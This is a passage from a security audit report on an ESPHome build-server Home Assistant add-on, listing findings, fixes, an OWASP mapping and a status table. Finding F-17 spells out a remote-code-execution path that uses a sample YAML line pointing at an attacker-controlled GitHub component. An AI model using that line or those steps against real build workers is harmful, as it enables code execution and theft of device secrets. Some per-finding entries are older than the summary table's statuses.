Use exact pins (`==`) with a hash-locked file (`pip-compile --generate-hashes` → `requirements.lock`) and install with `pip install --require-hashes -r requirements.lock` in both Dockerfiles. Pair this with a weekly Dependabot/Renovate job and a release-time gate in `dev-plans/RELEASE_CHECKLIST.md` that refuses to ship if any direct or transitive dependency has a known high/critical advisory per `pip-audit` / `npm audit`. Partial pinning (`~=3.9`) is not sufficient for supply-chain integrity — without hashes, a compromised upstream can publish a matching patch version that will be silently adopted on the next image rebuild.

---

### F-13 — Docker Image Uses `$BUILD_FROM` Without Pinned Base

**Severity:** LOW

**Description:**

`ha-addon/Dockerfile` uses `ARG BUILD_FROM` without a default, meaning the base image is determined entirely by the HA add-on build system. The HA base images are generally well-maintained, but the Dockerfile itself has no mechanism to verify the provenance or integrity of the base image. Combined with unpinned Python dependencies, the image's dependency graph is fully determined at build time by external parties.

**Affected code:** `ha-addon/Dockerfile:1-2`

**Recommended fix:**

For builds you control directly, pin the `BUILD_FROM` to a specific digest (`FROM ghcr.io/home-assistant/...:sha256-...`). For HA add-on builds, this is partially constrained by the HA add-on build infrastructure, but documenting the trust assumption is worthwhile.

---

### F-14 — `run.sh` Reads Auth Token from Plaintext File with No Permission Check

**Status (2026-04-16):** **FIXED (1.5.0-dev.77)** via SA.2. `app_config.py` now invokes `TOKEN_FILE.chmod(0o600)` immediately after `write_text`, wrapped in try/except so a failed chmod logs at DEBUG rather than blocking startup (for filesystems where chmod is unavailable).

**Severity:** Info

**Description:**

`run.sh` lines 7-10 read the auth token from `/data/auth_token` using a polling loop:

```bash
TOKEN=$(cat /data/auth_token 2>/dev/null || echo "")
```

The file is created by `app_config.py` line 36 with no explicit mode — it inherits the process umask. Inside the Docker container, this is acceptable, but there is no verification that the file has restricted permissions (e.g., `0600`). If the `/data` volume is mounted with world-readable permissions on the host, the token is readable by any process on the host with access to the volume.

**Affected code:** `run.sh:7-10`, `app_config.py:36` (`TOKEN_FILE.write_text`)

**Recommended fix:**

Write the token file with explicit mode `0600`:
```python
TOKEN_FILE.write_bytes(token.encode())
TOKEN_FILE.chmod(0o600)
```

---

### F-15 — `X-Ingress-Path` Header Injected Into HTML Without Sanitization

**Status (2026-04-16):** **FIXED (1.5.0-dev.77)** via SA.1. `serve_index` now strips any character not in `[/A-Za-z0-9._-]` from the Supervisor-supplied `X-Ingress-Path` before interpolating it into `<base href="…">`. When the sanitized value is empty, falls through to the default `<base href="./">`. Defence-in-depth — Supervisor sets the header on the HA happy path and untrusted clients can't reach it there.

**Severity:** Info

**Description:**

`main.py` lines 118-123 inject the `X-Ingress-Path` header value into the HTML response using a simple string replace:

```python
html = html.replace(
    '<base href="./">',
    f'<base href="{ingress_path}">',
)
```

`X-Ingress-Path` is set by the HA Supervisor and should be a trusted value. In the HA ingress flow, this header cannot be set by untrusted clients. However, if the add-on is ever accessed via a path where the header could be influenced by a user (e.g., a misconfigured proxy), an attacker could inject arbitrary HTML attributes or break out of the `href` attribute. The Supervisor IP bypass on the API tier (`main.py:47`) does not apply here since this is a GET request to `/` or `/index.html`, which bypasses auth entirely.

**Affected code:** `main.py:116-124`

**Recommended fix:**

Sanitize `ingress_path` to contain only URL-safe characters (path segments, slashes) before injecting it into HTML. A simple regex `re.sub(r'[^/a-zA-Z0-9._-]', '', ingress_path)` is sufficient.

---

### F-16 — Registry Is Not Persistent; Worker State Lost on Server Restart

**Severity:** Info

**Description:**

`registry.py` is explicitly documented as "in-memory, no persistence needed." On server restart, all registered workers disappear. Combined with the job queue restart recovery (which resets `WORKING` jobs to `PENDING`), this is handled correctly. However, it means a worker that was mid-job when the server restarted will eventually time out and retry — which is correct behavior — but the `assigned_hostname` on restarted jobs is lost until the worker re-registers and re-claims.

This is an operational observation, not a security issue. It is noted here because the `to_dict` output for jobs includes `assigned_client_id` (a UUID) even after the worker has gone; the UI correctly falls back to `assigned_hostname` for display, but downstream tooling consuming the API should be aware.

**Affected code:** `registry.py`, `job_queue.py:53` (`assigned_hostname` field)

---

### F-17 — Unauthenticated UI + `external_components` in YAML → Worker RCE

**Status (2026-04-16):** **WONTFIX** per threat model. `external_components:`, `esphome.includes:`, and `libraries:` with git/URL sources are core ESPHome features that real users rely on (any half-interesting ESPHome config uses at least one). Scanning YAML and refusing to compile configs that use them would be a feature regression, not a hardening win. The **unauthenticated-UI** half of the finding is addressed by `require_ha_auth` (F-03 FIXED, mandatory in 1.5 per AU.7); YAML edits + compile enqueues now require HA auth, making this "authenticated HA user can RCE workers" — which is fine per the threat model (operator is trusted).

**Severity:** HIGH (if port 8765 is directly reachable) / MEDIUM (HA Ingress only)

**Description:**

ESPHome's YAML resolver supports an `external_components:` key that references a git repository. At compile time, ESPHome clones that repository and imports its Python modules into the compile process. This is a standard and intentional ESPHome feature.

In this project, the UI API `POST /ui/api/targets/{filename}/content` endpoint accepts arbitrary YAML content and writes it to the ESPHome config directory (path traversal is correctly blocked — see F-09). That endpoint lives behind the UI auth tier, which per F-03 has **no authentication of its own** and relies entirely on HA Ingress. If port 8765 is reachable directly (misconfigured firewall, direct-port access, another device on the Docker network), an unauthenticated attacker can:

1. `POST` a malicious YAML containing `external_components: [{ source: github://attacker/evil-component, components: [foo] }]`
2. `POST /ui/api/compile` to enqueue a compile job for that target
3. Wait for any worker to claim the job

When the worker compiles, ESPHome clones `attacker/evil-component` and executes its Python as part of the build. The attacker now has code execution on the worker with full access to `secrets.yaml` (F-04), network access to the ESP devices, and the ability to tamper with build artifacts flashed to those devices. The same vector works via `esphome.includes:` pointing at attacker-controlled Python, and via `libraries:` entries with git URLs.

This finding is an amplification of F-03 but deserves its own entry because the blast radius is **remote code execution on every build worker**, not just unauthorized config changes.

**Affected code:** `ha-addon/server/ui_api.py` (save_target_content), `ha-addon/server/scanner.py` (`_resolve_esphome_config`), `ha-addon/client/client.py` (compile path)

**Recommended fix:**

The cleanest fix is to close F-03 (add authentication to the UI API) — that alone removes the unauthenticated attacker and leaves only the "authorized HA user can RCE workers" case, which matches the stated trust model. For defence in depth, add a server-side YAML scan before enqueueing a job: reject (or require an explicit `allow_external_code: true` add-on option to accept) any target whose resolved config contains `external_components`, `esphome.includes` referencing Python files, or `libraries:` entries with git/URL sources. Worker-side, enforce the same check after bundle extraction and refuse to run the compile if the flag is not set.

---

### F-18 — Worker `pip install esphome==<version>` Is Not Hash-Pinned

**Status (2026-04-16, re-assessed after SC.3 shipped):** **FIXED (partial)** in 1.5.0 via SC.3.

- `ha-addon/client/esphome-constraints/<version>.txt` ships inside the worker Docker image, one hash-pinned constraints file per ESPHome version we support. Generator: `scripts/regen-esphome-constraints.sh <version>` runs `pip-compile --generate-hashes --strip-extras` inside `python:3.11-slim` / linux/amd64 so the hashes match what a worker will actually download. A scheduled GitHub Action (`.github/workflows/regen-esphome-constraints.yml`) opens a PR weekly for any new stable ESPHome release and bumps `IMAGE_VERSION` in lockstep.
- `version_manager._install()` checks for the file via `_constraints_for(version)`. When present, the install runs `pip install --require-hashes -c <file> --no-cache-dir esphome==<version>` — any wheel whose SHA-256 doesn't match fails the install.
- When the constraints file is **missing**, the install still runs (unpinned) and logs a WARNING so operators can see the gap in logs. This is a deliberate graceful-degradation choice so a user on an older ESPHome version doesn't get locked out by the 1.5 upgrade, not an acceptance of the risk.

**Remaining work:** flip the missing-file branch from WARNING to refusal once the constraints directory covers every ESPHome version we expect to support (the weekly GH Action will keep pace with new stable releases). Tracked as a 1.6 follow-up item; no new code needed, just a one-line change in `_install()` to `raise RuntimeError` instead of warning. Closing this fully would move F-18 from PARTIAL → FIXED.

**Severity:** HIGH

**Description:**

`ha-addon/client/version_manager.py:137` installs ESPHome versions on demand:

```python
subprocess.run([str(pip), "install", "--no-cache-dir", f"esphome=={version}"], ...)
```

The version string is the exact version requested by the job (typically `esphome.esphome_version` from the target YAML, defaulting to the latest PyPI release the server knows about). There is no `--require-hashes`, no `--index-url` override, no constraint file, and no offline mirror. Every fresh worker, and every new version request, fetches ESPHome and its full transitive dependency graph — several hundred packages — from public PyPI and executes them as soon as the compile starts.

Consequences:

- A compromised release of **any** package in ESPHome's graph (including the hundreds of PlatformIO / framework-adjacent deps) executes on every worker within the normal update cadence.
- A malicious or typosquatted version selection pushed through a compromised server or MitM could direct workers to install an attacker-published ESPHome version (though this specific path overlaps with F-02 / F-05).
- Unlike the top-level `requirements.txt` (F-12), this install happens at **job time** on a live worker, so a lockfile at image-build time does not cover it.

**Affected code:** `ha-addon/client/version_manager.py:119-155`

**Recommended fix:**

Ship a pre-generated, hash-pinned constraints file per supported ESPHome version inside the worker Docker image (e.g., `esphome-constraints/2026.3.3.txt` generated by `pip-compile --generate-hashes`). Pass `--require-hashes -c esphome-constraints/<version>.txt` to the install. For versions not covered by the shipped constraints, refuse the install (with a clear error message to the user) rather than silently falling back to unverified resolution. Regenerate the constraints files as part of the release process.

---

### F-19 — GitHub Actions Referenced by Floating Tags

**Severity:** LOW

**Description:**

Every workflow in `.github/workflows/` references external actions by major-version tag (`actions/checkout@v4`, `actions/setup-python@v5`, `actions/setup-node@v4`, `actions/upload-artifact@v4`). Git tags are mutable, and a compromise of any of those action repos — or a tag-move attack — results in attacker-controlled code running in CI with access to repository secrets (including the `GITHUB_TOKEN` used to publish GHCR images on `main`).

**Affected code:** `.github/workflows/ci.yml`, `.github/workflows/compile-test.yml`, `.github/workflows/publish-client.yml`, `.github/workflows/publish-server.yml`

**Recommended fix:**

Pin each action to a full commit SHA with a trailing version comment, e.g. `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`. Dependabot understands this format and will open PRs to update the SHA + comment when a new version ships. Not included in this round: this is a low-severity hardening item but easy to do alongside the rest of Workstream E.

---

### F-20 — Missing Security Response Headers on UI Responses

**Severity:** LOW

**Description:**

`ha-addon/server/main.py` serves the React UI via `serve_index`, and `ui_api.py` returns JSON responses, but none of these responses set `Content-Security-Policy`, `X-Frame-Options` (or `Content-Security-Policy: frame-ancestors`), `X-Content-Type-Options`, or `Referrer-Policy`. An XSS vector (see F-01 / F-10 chain historically, and any future bug that reintroduces one) would have fewer mitigations to fight through than is standard for a credentialed admin UI. The UI also has no protection against being framed by a malicious HA dashboard card or an external page that tricks an authenticated HA user into clicking through to a compile action.

**Affected code:** `ha-addon/server/main.py` (`serve_index`), `ha-addon/server/ui_api.py` (all responses)

**Recommended fix:**

Add an aiohttp middleware that attaches the following headers to every UI-tier response:

- `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self' wss: https://schema.esphome.io; frame-ancestors 'self'` (tune the list once C.5 moves the schema fetch server-side)
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: no-referrer`
- `Permissions-Policy: accelerometer=(), camera=(), geolocation=(), microphone=()`

Do not apply these headers to the `/api/v1/*` worker tier — those responses are consumed programmatically and the headers add no value there.

---

## OWASP Top 10 (2021) Assessment

A mapping of this project's findings against OWASP's Top 10 web application risks. Status reflects current code (1.4.1-dev.33, last refreshed 2026-04-15).

| Category | Status | Evidence in this project |
|---|---|---|
| **A01 Broken Access Control** | Accepted per threat model | F-03 FIXED (mandatory `require_ha_auth` in 1.5, AU.7). F-06/F-07/F-08 all **WONTFIX** per threat model §4/§5/§3 (Supervisor / operator / workers all trusted). |
| **A02 Cryptographic Failures** | Accepted per threat model | F-05 WONTFIX (plaintext HTTP on trusted LAN), F-01 WONTFIX (browser is trusted; required for Connect Worker UX), **F-14 FIXED (1.5.0-dev.77 via SA.2)**. |
| **A03 Injection** | OK | Subprocess invocations use argument lists; YAML parsed via ESPHome's `safe_load`-based resolver; all `/api/v1/*` handlers parse through typed pydantic (1.3.1). **F-15 FIXED (1.5.0-dev.77 via SA.1)** — `X-Ingress-Path` sanitized before HTML interpolation. No remaining residual. |
| **A04 Insecure Design** | Accepted per threat model | F-02 **WONTFIX** (workers trusted), F-04 **WONTFIX** (workers trusted), F-17 **WONTFIX** (core ESPHome feature). F-18 FIXED (partial) in 1.5.0 via SC.3 — was the only F-* item explicitly NOT accepted by the threat model, now the missing-file graceful-degradation branch is the remaining gap. |
| **A05 Security Misconfiguration** | OK (1.3.1+) | F-13 (base image digest — WONTFIX, HA controls BUILD_FROM). **F-20 CLOSED in 1.3.1 via `security_headers_middleware`** (CSP, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, X-Frame-Options on every `/ui/api/*` + static response). Not audited: whether containers run as root (likely yes — neither Dockerfile sets `USER`) |
| **A06 Vulnerable & Outdated Components** | Largely OK (1.3.1+) | **F-12 CLOSED:** hash-pinned lockfiles + `--require-hashes` install + `pip-audit` in CI + `npm audit` in CI + Dependabot weekly PRs (pip × 2, npm, docker × 2, github-actions) + PY-7 (CVE applicability assessment) + PY-8 (lockfile sync) invariants. **F-18 FIXED (partial)** in 1.5.0 via SC.3 — worker-time `esphome==<version>` install now uses committed hash-pinned constraints when available. |
| **A07 Identification & Authentication Failures** | Accepted per threat model | Single static shared token with no rotation story (threat model §3 — workers are trusted). F-07 WONTFIX; sanity-limit mitigations from 1.3.x stay (log cap, parallel-jobs clamp, log-append DoS guard). |
| **A08 Software & Data Integrity Failures** | Partial | F-02 WONTFIX (workers trusted). F-18 FIXED (partial) in 1.5.0 via SC.3 — worker pip install uses `--require-hashes` against a committed constraints file. F-19 FIXED (1.4.1 SC.1 — SHA-pinned Actions). Cosign-signed GHCR images + SBOM attestations (1.4.1 SC.2). |
| **A09 Security Logging & Monitoring Failures** | Partial | **Auth middleware now emits structured 401 reasons with peer IP (1.3.1 bug #3 + C.2).** No audit log of who triggered compiles or edited configs; no alerting on repeated auth failures. Server logs sufficient for post-incident forensics |
| **A10 Server-Side Request Forgery (SSRF)** | Low | `device_poller.py` only contacts mDNS-discovered ESPHome devices on well-known ports; the editor fetches ESPHome's JSON schema from `schema.esphome.io` (moved into a dedicated `api/esphomeSchema.ts` module during the 1.3.1 UI-1 cleanup — no attacker-controlled URL reaches a server-side fetcher) |

**Highest-leverage fixes that remain** (ordered by ease × impact):

1. **F-18 worker pip install hash-pinning** — **FIXED (partial)** in 1.5.0 via SC.3. `ha-addon/client/esphome-constraints/<version>.txt` ships inside the worker image; `version_manager._install()` runs `pip install --require-hashes -c <file> esphome==<version>` when the file is present. Missing-file branch logs a WARNING and installs unpinned (graceful-degradation for ESPHome versions we haven't committed constraints for yet). Remaining work for full closure: flip the WARNING to a refusal once constraints coverage is complete — a one-line change in `_install()` once the weekly regen workflow has built up the catalog.

*(F-14 and F-15 shipped in 1.5.0-dev.77 via SA.2 and SA.1 respectively — see their per-finding entries above.)*

---

## Positive Findings

The following aspects of the implementation are done well and worth noting explicitly.

**Token generation with `secrets.token_hex`:** `app_config.py` uses `secrets.token_hex(16)` to generate the auth token when none is configured. This is cryptographically strong and correct.

**Atomic file writes for persistence:** Both `job_queue.py` (`_persist`) and `device_poller.py` (`_save_cache`) write to a `.tmp` file and atomically rename it to the final path. This prevents partial writes from corrupting the persisted state.

**Path traversal protection on file endpoints:** `ui_api.py` correctly uses `Path.resolve()` + `relative_to()` to guard the config file read and write endpoints against directory traversal attacks. The check is in the right place and uses the right primitive.

**Log endpoint uses `textContent`, not `innerHTML`:** The log modal in `static/index.html` line 1050 assigns build log content via `textContent`, which is safe against XSS. All other user-supplied strings are passed through `escapeHtml()` before being placed in innerHTML.

**Deduplication prevents queue flooding per-target:** `JobQueue.enqueue` refuses to add a second active job for the same target, preventing trivial queue amplification via repeated compile requests for the same device.

**ESPHome YAML resolution uses ESPHome's own pipeline:** `scanner.py` uses ESPHome's internal `load_yaml` + `do_packages_pass` + `do_substitution_pass` chain rather than a hand-rolled YAML parser. This means `!include`, `packages:`, and `${substitutions}` are all handled consistently with ESPHome's own behavior, reducing divergence bugs.

**Worker path validation on auto-update:** `client/client.py` line 509 checks that the target path's parent matches the worker directory before writing update files, preventing the server from writing to arbitrary locations via path injection in the filename.

**Heartbeat-based liveness detection:** The registry uses a configurable `worker_offline_threshold` to determine worker online status rather than a hard-coded magic number, and it is applied consistently in both the API and the UI.

**`tarfile.extractall` uses `filter="data"`:** `client/client.py` line 468 passes `filter="data"` to `extractall`, which is the Python 3.12 recommended way to prevent tar extraction from setting dangerous file permissions or overwriting absolute paths. This is a correct and modern usage.

---

## Summary Table

Status legend: **FIXED** (resolved, release noted) · **PARTIAL** (partially mitigated in the release noted; residual risk remains) · **OPEN** (still live, planned to fix) · **WONTFIX** (accepted risk by design for the HA add-on threat model) · **INFO** (observation, no action planned).

Status as of 1.5.0-dev.75+ (last reviewed 2026-04-16).

| ID   | Finding                                              | Severity | Status | Notes |
|------|------------------------------------------------------|----------|--------|-------|
| F-01 | Auth token exposed to browser via server-info API    | High     | WONTFIX | Threat model §1: browser is trusted. Required for the Connect Worker modal's `docker run` command UX. |
| F-02 | Worker auto-update executes arbitrary server code    | High     | WONTFIX | Threat model §3: every connected worker is trusted (shared bearer token = full fleet compromise either way). 1.3.0 LIB.0/LIB.1 image-version gating stays. Feature reverted + restored as bug #58; no further remediation planned. |
| F-03 | UI API unauthenticated if port 8765 is directly accessible | Medium | FIXED (1.5.0, mandatory `require_ha_auth`) | AU.1–AU.7. `auth_api: true` + HA Bearer validation via Supervisor `/auth` + add-on-token "system" Bearer path for the native HA integration. |
| F-04 | `secrets.yaml` included in every build bundle        | Medium   | WONTFIX | Threat model §3: workers are trusted. Required for ESPHome's `!secret` resolution on the worker. |
| F-05 | Worker-server communication is plaintext HTTP        | Medium   | WONTFIX | Threat model §2: LAN is trusted. Users with remote workers across segments can front the server with their own reverse proxy (documented). |
| F-06 | Supervisor IP bypass grants unauthenticated API access | Low    | WONTFIX | Threat model §4: Supervisor is trusted. Standard HA add-on pattern. 1.3.x hardening (`_normalize_peer_ip()`, structured 401 logging, `HA_SUPERVISOR_IP` constant) stays. |
| F-07 | No rate limiting or queue size cap                   | Low      | WONTFIX | Threat model §5: operator is trusted; home-fleet scale doesn't generate real queue pressure. 1.3.x partial mitigations (512 KB per-log cap, max_parallel_jobs clamp, 2 MB log-append guard) stay as sanity limits. |
| F-08 | Job results not validated against the claiming worker | Low     | WONTFIX | Threat model §3: workers are trusted. Firmware-upload endpoint does enforce `X-Client-Id == assigned_client_id` (bug #24 — data-loss race, not a security remediation). `submit_result`/`update_status` deliberately not extended. |
| F-09 | Path traversal check correct but worth hardening     | Low      | FIXED (1.3.0) | PY.1 introduced `helpers.safe_resolve()` and every UI API file endpoint now uses it. |
| F-10 | Monaco editor loaded from unpinned CDN (no SRI)      | Low      | FIXED (1.1.0) | React UI rewrite bundles `monaco-editor` + `@monaco-editor/react` via Vite (verified in `node_modules/monaco-editor/`). No external CDN. |
| F-11 | Build log content stored unredacted                  | Info     | NOT A FINDING | Logs contain values (WiFi passwords, OTA passwords, API keys) that the server itself distributed to the worker via `secrets.yaml` (F-04, accepted). Returning them to the server that already has them doesn't cross a trust boundary. Removed from residual-findings list. |
| F-12 | Dependency versions not pinned                       | Low      | FIXED (1.3.1) | Confirmed 2026-04-16: `ha-addon/{server,client}/requirements.lock` present, `--require-hashes` install, `pip-audit` + `npm audit` in CI, Dependabot weekly, PY-7 + PY-8 + PY-9 invariants enforced. |
| F-13 | Docker base image not pinned to a digest             | Low      | WONTFIX | HA add-on build infrastructure controls `BUILD_FROM`; pinning a digest would break the official build flow. |
| F-14 | Auth token file written without explicit permissions | Info     | **FIXED (1.5.0-dev.77)** | SA.2: `TOKEN_FILE.chmod(0o600)` immediately after `write_text`, wrapped in try/except so chmod failure on unusual filesystems logs at DEBUG rather than blocking startup. |
| F-15 | `X-Ingress-Path` injected into HTML unsanitized      | Info     | **FIXED (1.5.0-dev.77)** | SA.1: regex strips anything not in `[/A-Za-z0-9._-]` before interpolation; empty sanitized value falls through to default `<base href="./">`. |
| F-16 | Worker registry not persistent (operational note)    | Info     | INFO | By design — registry is in-memory. 1.6 **WC.1–WC.5** (durable `WORKER_NAME`) will make this less operationally painful. |
| F-17 | Unauth UI + `external_components` → worker RCE       | High     | WONTFIX | Threat model §3: workers are trusted. `external_components` / `includes` / `libraries` are core ESPHome features users rely on; refusing configs that use them would be a feature regression. F-03 flipped to mandatory in 1.5 (AU.7), so this is now "authenticated HA user can RCE workers" — accepted per threat model. |
| F-18 | Worker pip install is not hash-pinned                | High     | **FIXED (partial) — 1.5.0** (SC.3) | `version_manager._install` uses `pip install --require-hashes -c esphome-constraints/<version>.txt` when a committed constraints file exists; missing-file branch logs WARNING + installs unpinned (graceful-degradation). Weekly GH Action regenerates for new ESPHome releases + bumps `IMAGE_VERSION`. Remaining: flip missing-file to refusal once coverage is complete (1.6). |
| F-19 | GitHub Actions referenced by floating tags           | Low      | FIXED (1.4.1, SC.1) | Every non-local `uses:` across the 4 workflow files now pins a 40-char commit SHA with trailing `# vN.M.P` comment. `check-invariants.sh` rule + Dependabot watching. |
| F-20 | Missing security response headers on UI              | Low      | FIXED (1.3.1) | `security_headers_middleware` attaches CSP, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, `X-Frame-Options` on `/ui/api/*` + static. Tests in `test_security_headers.py`. |
